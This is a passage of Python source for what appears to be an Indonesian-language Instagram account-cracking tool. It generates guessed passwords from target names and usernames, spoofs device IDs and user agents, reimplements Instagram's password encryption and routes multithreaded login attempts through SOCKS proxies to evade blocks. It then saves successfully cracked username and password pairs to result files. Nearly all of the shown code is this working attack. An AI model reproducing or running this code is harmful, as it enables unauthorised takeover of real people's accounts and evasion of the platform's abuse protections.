		mod=rc(['galahad','curtana','sunny','cepheus','joyeuse','begonia','wind','secret','angelica','raphael','vili','taoyao','ginkgo','renoir','haydn','tapas','fleur','merlinnfc','spesn','pomelo','miel'])
		uami=(f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi/Redmi; {xiaomi}; {mod}; {com}; in_ID)")
		return uami
	def ua_casper(self):
		andro=random.choice([f"33/13","29/10","24/7.0","31/12","30/11","28/9"])
		pixel=random.choice([f"1080x2186","1080x2275","1760x792","1920x864","2400x1080","3200x1440","1080x1920","900x1600","720x1280","540x960","1920x1080","160x900","1280x720","960x540"])
		dpi=random.choice(["133","320","515","160","640","240","120","800","480","225","768","216","1024"])
		locale = random.choice(["en_US", "es_ES", "fr_FR", "de_DE", "it_IT", "pt_PT", "ja_JP", "ko_KR", "zh_CN", "ar_SA", "ru_RU", "tr_TR","in_ID"])
		versi=self.vers()
		ua=random.choice([
			f"Instagram {versi} Android ({andro}; {dpi}; {pixel}; Casper; CASPER_VIA_M3; CASPER_VIA_M3; qcom; in_ID)",
			f"Instagram {versi} Android ({andro}; {dpi}; {pixel}; Casper; Casper_S28; Casper_S28; qcom; in_ID)",
			f"Instagram {versi} Android ({andro}; {dpi}; {pixel}; Casper; Casper_S28; Casper_S28; qcom; in_ID)",
			f"Instagram {versi} Android ({andro}; {dpi}; {pixel}; Casper; Casper_S38; Casper_S38; qcom; in_ID)",
			f"Instagram {versi} Android ({andro}; {dpi}; {pixel}; Casper; CASPER_VIA_M3; CASPER_VIA_M3; qcom; in_ID)",
			f"Instagram {versi} Android ({andro}; {dpi}; {pixel}; Casper; VIA_A1; VIA_A1; qcom; in_ID)",
			f"Instagram {versi} Android ({andro}; {dpi}; {pixel}; Casper; VIA_A1_1; VIA_A1_1; qcom; in_ID)",
			f"Instagram {versi} Android ({andro}; {dpi}; {pixel}; Casper; VIA_A1_Plus; VIA_A1_Plus; qcom; in_ID)"
			])
		return ua
	def vers(self):
		igv=("100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,79.0.0.21.101,78.0.0.11.104,77.0.0.20.113,76.0.0.15.395,75.0.0.23.99,74.0.0.21.99,73.0.0.22.185,72.0.0.21.98,71.0.0.18.102,70.0.0.22.98,69.0.0.30.95,68.0.0.11.99,67.0.0.25.100,66.0.0.11.101,65.0.0.12.86,64.0.0.14.96,63.0.0.17.94,62.0.0.19.93,61.0.0.19.86,60.1.0.17.79,59.0.0.23.76,58.0.0.12.73,57.0.0.9.80,56.0.0.13.78,55.0.0.12.79,54.0.0.14.82,53.0.0.13.84,52.0.0.8.83,51.0.0.20.85,50.1.0.43.119,271.1.0.21.84,131.0.0.23.11,130.0.0.31.12,128.0.0.26.12,126.0.0.25.12,125.0.0.20.12,124.0.0.17.47,123.0.0.21.11,122.0.0.29.23,120.0.0.29.11,119.0.0.33.14,118.0.0.28.12,117.0.0.28.12,115.0.0.26.11,114.0.0.38.12,113.0.0.39.12,112.0.0.29.12,111.1.0.25.15,110.0.0.16.11,109.0.0.18.12,108.0.0.23.11,107.0.0.27.12,106.0.0.24.11,105.0.0.18.11,104.0.0.21.11,103.1.0.15.11,102.0.0.20.11,101.0.0.15.12,100.0.0.17.12,99.0.0.32.182,98.0.0.15.119,97.0.0.32.119")
		igve=igv.split(",")
		versi=random.choice(igve)
		return versi
	def ua_igeh(self):
		versi=self.vers()
		andro=random.choice(["31/12","33/13","30/11","29/10"])
		dpi=random.choice(["440dpi","320dpi"])
		pixel=random.choice(["1080x2168","1080x2263","1080x2180","1080x2177","720x1449"])
		model=random.choice(["Redmi Note 9S","2303ERA42L","2201116SG","2201117TG","Redmi Note 9 Pro","220233L2G","2201117SI","2201117SL","M2006C3LG"])
		lokasi=random.choice(["curtana","ocean","veux","spes","joyeuse","dandelion","miel"])
		ua=f"Instagram {versi} Android ({andro}; {dpi}; {pixel}; Xiaomi/Redmi; {model}; {lokasi}; qcom; in_ID)"
		return ua
	def ingfo(self):
		urut = []
		prints(Panel(f"[{bc}!{hapus}] Hasil crack akan di simpan di dalam folder results", padding=(0,2),style=""))
		urut.append(Panel(f"result/[bold green]success-{day}.txt[/]",padding=(0,2),style=""))
		urut.append(Panel(f"result/[bold yellow]checkpoint-{day}.txt[/]",padding=(0,4),style=""))
		self.tol.print(Columns(urut))
	def ifo(self):
		urut = []
		prints(Panel(f"[{bc}+{hapus}] Pilih methode",style=""))
		urut.append(Panel("[01] Methode [bold cyan]API[/]",padding=(0,1),style=""))
		urut.append(Panel("[02] Methode [bold cyan]API V2[/]",padding=(0,1),style=""))
		urut.append(Panel("[03] Methode [bold cyan]AJAX[/]",padding=(0,1),style=""))
		self.tol.print(Columns(urut))
	def passwordAPI(self,xnx):
		idtar=f'[•] TOTAL ID  : [cyan]{len(internal)} [/cyan]'
		idtar1=nel(idtar,style='')
		sol().print(idtar1)
		self.ifo()
		u = input('  [?] Pilih methode : ')
		if u in ["1","01"]:
			method.append('satu')
		elif u in ["2","02"]:
			method.append('dua')
		elif u in ["3","03"]:
			method.append('tiga')
		else:
			method.append('satu')
		komb='[1] Name,Name123,Name1234\n[2] Name,Name123,Name1234,Name12345\n[3] Name,Name123,Name1234,Name12345,Name123456\n[4] Name,Name123,Name1234 + Password Manual'
		sol().print(nel(komb,title='[cyan]List Password[/cyan]'))
		c=input(f' {N}[•] Masukan Pilihan :{C} ')
		if c in ["01","1"]:
			self.generateAPI(xnx,c)
		elif c in ["2","02"]:
			self.generateAPI(xnx,c)
		elif c in ["3","03"]:
			self.generateAPI(xnx,c)
		elif c in ["4","04"]:
			prints(Panel(f"{P2}contoh password : sayang,anjing,bangsat",width=80,padding=(0,4),style=""))
			zx=input(f'{N}[•] Tambahkan password :{N} ')
			zz = zx.split(",")
			for i in zz:
				self.pwa.append(i)
			self.generateAPI(xnx,c,zx)		
		else:
			self.passwordAPI(xnx)

	def generateAPI(self,user,o,zx=''):
		self.ingfo()
		global prog,des
		prog = Progress(TextColumn('{task.description}'))
		des = prog.add_task('',total=len(user))
		with prog:
			with ThreadPoolExecutor(max_workers=40) as shinkai:
				for i in user:
					try:
						username=i.split("|")[0]
						password=clean(text=i.split("|")[1].lower(),no_emoji=True)
						for w in password.split(" "):
							if len(w)<3:
								continue
							else:
								w=w.lower()
								if o=="1":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w+'123',w+'1234']
									else:
										sandi=[w,w+'123',w+'1234']
								elif o=="2":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w+'123',w+'1234',password.lower()]
									else:
										sandi=[w+'123',w,w+'1234',password.lower()]
								elif o=="3":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w+'123',w+'1234',w+'321',w+'12345',w+'123456',w+'1234567',w+'12345678',w+'123456789',password.lower()]
									else:
										sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',w+'1234567',w+'12345678',w+'123456789',password.lower()]
								elif o=="4":
									for kontol in self.pwa:
										sandi=[w,w+'123',w+'1234']
										sandi.append(kontol)
								sandi.append(username.replace(".", "").replace("_", ""))
								sandi.append(username.replace(".", "").replace("_", "").replace("__", ""))
								sandi.append(username.replace(".", "").replace("_", "").replace("@", ""))
								sandi.append(w.replace(" ", ""))
								if 'satu' in method:
									shinkai.submit(self.crackAPI,username,sandi)
								elif 'dua' in method:
									shinkai.submit(self.crackAPI2,username,sandi)
								elif 'tiga' in method:
									shinkai.submit(self.ajax,username,sandi)
								else:
									shinkai.submit(self.crackAPI,username,sandi)
					except:
						continue
			print('\n')
			exit(f'[✓] crack akun selesai ngab, OK- {H}{len(success)}{N} CP- {K}{len(checkpoint)}{N}')
	def APIinfo(self,user):
		try:
			x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":"936619743392459"})
			x_jason=x.json()["data"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			nama = "-"
			pengikut = "-"
			mengikut = "-"
			postingan = "-"
		return nama,pengikut,mengikut,postingan
	def enc_password_web(self,key_id,pub_key,password,version=10):
		key_id=int(key_id)
		key=Random.get_random_bytes(32)
		iv=bytes([0]*12)
		time=int(datetime.now().timestamp())
		aes=AES.new(key,AES.MODE_GCM,nonce=iv,mac_len=16)
		aes.update(str(time).encode('utf-8'))
		encrypted_password,cipher_tag=aes.encrypt_and_digest(password.encode('utf-8'))
		pub_key_bytes=binascii.unhexlify(pub_key)
		seal_box=SealedBox(PublicKey(pub_key_bytes))
		encrypted_key=seal_box.encrypt(key)
		encrypted=bytes([1,key_id,
*list(struct.pack('<h',len(encrypted_key))),
*list(encrypted_key),
*list(cipher_tag),
*list(encrypted_password)])
		encrypted=base64.b64encode(encrypted).decode('utf-8')
		return f'#PWD_INSTAGRAM_BROWSER:{version}:{time}:{encrypted}'
	
	def enc_password(self,publickeyid,publickey,password):
		session_key=get_random_bytes(32)
		iv=get_random_bytes(12)
		timestamp=str(int(time.time()))
		decoded_publickey=base64.b64decode(publickey.encode())
		recipient_key=RSA.import_key(decoded_publickey)
		cipher_rsa=PKCS1_v1_5.new(recipient_key)
		rsa_encrypted=cipher_rsa.encrypt(session_key)
		cipher_aes=AES.new(session_key,AES.MODE_GCM,iv)
		cipher_aes.update(timestamp.encode())
		aes_encrypted,tag=cipher_aes.encrypt_and_digest(password.encode("utf8"))
		size_buffer=len(rsa_encrypted).to_bytes(2,byteorder="little")
		payload=base64.b64encode(b''.join([
            b'\x01',
            int(publickeyid).to_bytes(1,byteorder="big"),
            iv,
            size_buffer,
            rsa_encrypted,
            tag,
            aes_encrypted
]))
		return f"#PWD_INSTAGRAM:4:{timestamp}:{payload.decode()}"
	def uuid(self,heex=False,seed=None):
		if(seed is not None):
			m=hashlib.md5()
			m.update(seed.encode('utf-8'))
			x=uuid.UUID(m.hexdigest())
		else:
			x=uuid.uuid4()
		if(heex):
			return str(x.hex)
		return str(x)
	def adid(self,user=None):
		user=user if user is not None else '12345'
		sha2=hashlib.sha256()
		sha2.update(user.encode('utf-8'))
		seed=sha2.hexdigest()
		return self.uuid(False,seed)
	def guid(self):
		return self.uuid(False)
	def dvid(self):
		return f'android-{self.uuid(True)[:16]}'
	def poid(self,dvid):
		return self.uuid(False,dvid)
	def hmac(self,data,signature=None):
		signature=signature if signature is not None else 'SIGNATURE'
		return hmac.new(signature.encode('utf-8'),data.encode('utf-8'),hashlib.sha256).hexdigest()
	def signature(self,data,sign=None):
		sign=sign if sign is not None else 'SIGNATURE'
		return 'signed_body={}.{}&ig_sig_key_version=4'.format(sign,urllib.parse.quote_plus(data))
	def rawclient_time(self,lang):
		if lang in('in_ID','in-ID'):zone='Asia/Jakarta'
		else:zone='America/New_York'
		tz=pytz.timezone(zone)
		ct=datetime.now(tz)
		ft=ct.strftime('%Y-%m-%dT%H:%M:%S.%fZ')
		hash_obj=hashlib.sha256(ft.encode())
		hash_hex=hash_obj.hexdigest()
		return base64.b64encode(bytes.fromhex(hash_hex)).decode()
	def crackAPI2(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		rr=random.randint;rc=random.choice
		logtemp=0
		if logtemp > 10:logtemp=0
		prog.update(des,description=f"[{acakrich}crack[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		guid=self.guid()
		dvid=self.dvid()
		poid=self.poid(dvid)
		adid=self.adid(user)
		capa=random.choice(['3brTv10=','3brTvw8=','3brTvwM='])
		lang=random.choice(["en_US","in_ID","en_SG","en_GB","ms_MY"])
		cont=random.choice(["MOBILE(LTE)","WIFI"])
		ua=self.ua_infinix()
		expr={"id":guid,"server_config_retrieval":"1"}
		sync=ses.post("https://i.instagram.com/api/v1/launcher/sync/",data=expr,headers={
            "Host":"i.instagram.com",
            "Connection":"close",
            "Content-Type":"application/x-www-form-urlencoded; charset=utf-8",
            "Cookie2":"$Version=1",
            "Accept-Language":lang.replace("_","-"),
            "User-Agent":ua})
		csrf=sync.cookies.get("csrftoken")
		for pw in pas:
			try:
				data=json.dumps({
                    'phone_id':poid,
                    '_csrftoken':csrf,
                    'username':user,
                    'guid':guid,
                    'device_id':dvid,
                    'password':pw,
                    'login_attempt_count':'0'
})
				ses.headers.update({
                    'Host':'i.instagram.com',
                    'Accept-Language':lang.replace('_','-'),
                    'Accept-Encoding':'zstd,gzip,deflate',
                    'Connection':'close',
                    'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                    'User-Agent':ua,
                    'X-Ig-App-Locale':lang,
                    'X-Ig-Device-Locale':lang,
                    'X-Ig-Mapped-Locale':lang,
                    'X-Ig-App-Id':'567067343352427',
                    'X-Ig-Device-Id':guid,
                    'X-Ig-Family-Device-Id':dvid,
                    'X-Ig-Android-Id':poid,
                    'X-Ig-Timezone-Offset':self.timezone(lang),
                    'X-Ig-Capabilities':capa,
                    'X-Ig-Connection-Type':cont,
                    'X-Ig-Connection-Speed':str(random.randint(1000,3700))+'kbps',
                    'X-Pigeon-Session-Id':'UFS-'+str(self.uuid(True)),
                    'X-Pigeon-Rawclienttime':str(self.rawclient_time(lang)),
                    'X-Ig-Bandwidth-Speed-KBPS':str(random.randint(1000,9000)),
                    'X-Ig-Bandwidth-TotalBytes-B':str(random.randint(1000000,5000000)),
                    'X-Ig-Bandwidth-Totaltime-Ms':str(random.randint(200,800)),
                    'X-Ig-App-Startup-Country':lang.split('_')[1],
                    'X-Bloks-Version-Id':'e097ac2261d546784637b3df264aa3275cb6281d706d91484f43c207d6661931',
                    'X-Bloks-Is-Layout-Rtl':'false',
                    'X-Bloks-Is-Panorama-Enabled':'true',
                    'X-Fb-Http-Engine':'Liger',
                    'X-Fb-Client-Ip':'true',
                    'X-Fb-Server-Cluster':'true'
})
				prox={'http':'socks5://'+random.choice(self.socks5)}
				xnxx=ses.post('https://i.instagram.com/api/v1/accounts/login/',data=self.signature(data),proxies=prox)
				if 'logged_in_user' in xnxx.text or 'sessionid' in xnxx.cookies.get_dict():
					success.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
					print("")
					open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{xnxx.text}\n')
					break
				elif 'https://i.instagram.com/challenge' in str(xnxx.text):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					#print("")
					#prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
					#print("")
					open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					#checkpoint.append(user)
					open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{xnxx.text}\n')
					break
				elif 'ip_block' in str(xnxx.text) or 'spam' in str(xnxx.text):
					prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
					prog.advance(des)
					time.sleep(10);self.crackAPI2(user,pas)
					open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{xnxx.text}\n{N}\n')
					loop-=1
					break
				else:open('.logCrack','a').write(f'{N}╭({loop}) {user} || {pw}\n╰{xnxx.text}{ua}\n{N}\n')
			except requests.exceptions.ConnectionError:
				prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
				prog.advance(des)
				time.sleep(5)
				self.crackAPI2(user,pas)
				loop-=1
				break
			#except Exception as e:print(e)
		loop+=1
	def crackAPI(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		logtemp=0
		if logtemp > 10:
			logtemp=0
		guid = str(uuid.uuid4())
		ponid=str(uuid.uuid4())
		andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
		ig_sig=HARIS["ig_sig"]
		ua=self.ua_ran()
		dat=HARIS["sinkz"]
		dat.update({"id": guid})
		data1=json.dumps(dat)
		ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
		data2=HARIS["sinkz1"]
		data2.update({'signed_body': f'{ned}.{str(data1)}'})
		head=HARIS["headaing"]
		head.update({"user-agent": ua})
		while True:
				try:
					p=ses.post(HARIS["sinkz2"],headers=head,data=data2)
					break
				except:pass
		prog.update(des,description=f"[{acakrich}crack[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
				try:
					data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw.replace(' ','+'),"login_attempt_count": str(logtemp)})
					ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
					head2=HARIS["headaing1"]
					head2.update({"user-agent": ua})
					sianjing=HARIS["sianjing"]
					setan=sianjing.split("||")
					pasw=pw.replace(' ','+')
					dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pasw}{setan[7]}{logtemp}{setan[8]}'
					respon=ses.post(HARIS["crack"],headers=head2,data=dataa)
					try:
						ncek=json.loads(respon.text)
					except:
						ncek=respon.text
					logtemp+=1
					if "logged_in_user" in str(ncek):
						success.append(user)
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						try:
							print("")
							prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
						except:
							prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							break
					elif 'https://i.instagram.com/challenge' in str(respon.text):
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						print("")
						prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
						print("")
						open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
						checkpoint.append(user)
						open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
						break
					elif 'ip_block' in str(respon.text) or 'spam' in str(respon.text):
						prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
						prog.advance(des)
						time.sleep(10);self.crackAPI(user,pas)
						open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
						loop-=1
						break
					else:open('.logCrack','a').write(f'{N}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
				except requests.exceptions.ConnectionError:
					prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
					prog.advance(des)
					time.sleep(5)
					self.crackAPI(user,pas)
					loop-=1
					break
				#except Exception as e:prints(e)
		loop+=1
	def ua_metode3(self):
		ua=random.choice([
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Cortana 1.14.2.19041; 10.0.0.0.19043.1237) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Cortana 1.13.0.18362; 10.0.0.0.18363.900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
		])
		return ua
	def ajax(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		prog.update(des,description=f"[{acakrich}crack[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		ua=self.ua_metode3()
		lang=random.choice(['en_US','en_GB','in_ID'])
		xapp='936619743392459'
		port='891'
		ajax=random.choice(['1','1008549155','1008550186'])
		head={
            'Host':'www.instagram.com',
            'Accept':'*/*',
            'Content-Type':'application/x-www-form-urlencoded',
            'User-Agent':ua,
            'X-ASBD-ID':'129477',
            'X-IG-App-ID':xapp,
            'X-IG-WWW-Claim':'0',
            'X-Instagram-AJAX':ajax,
            'X-Requested-With':'XMLHttpRequest',
            'Origin':'https://www.instagram.com',
            'Referer':'https://www.instagram.com/accounts/login/',
            'viewport-width':port
}
		resp=ses.get('https://www.instagram.com/api/v1/web/accounts/login/ajax/',headers=head)
		keys=resp.headers.get('ig-set-password-encryption-web-key-id')
		pubs=resp.headers.get('ig-set-password-encryption-web-pub-key')
		csrf=resp.cookies.get('csrftoken')
		for pw in pas:
			try:
				ses.headers.update(head)
				ses.headers.update({'X-CSRFToken':csrf})
				encp=self.enc_password_web(keys,pubs,pw)
				data={
                    'enc_password':encp,
                    'username':user,
                    'queryParams':{},
                    '_csrftoken':csrf,
                    'optIntoOneTap':'false',
                    'stopDeletionNonce':''
}
				prox={'http':'socks4://'+random.choice(self.socks4)}
				respon=ses.post('https://www.instagram.com/accounts/login/ajax/',data=data,proxies=prox)
				haris=json.loads(respon.text)
				if 'logged_in_user' in respon.text or 'sessionid' in respon.cookies.get_dict():
					success.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
					print("")
					open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
					open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					break
				elif "/challenge/action" in str(haris):
					#checkpoint.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					#print("")
					#prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
					#print("")
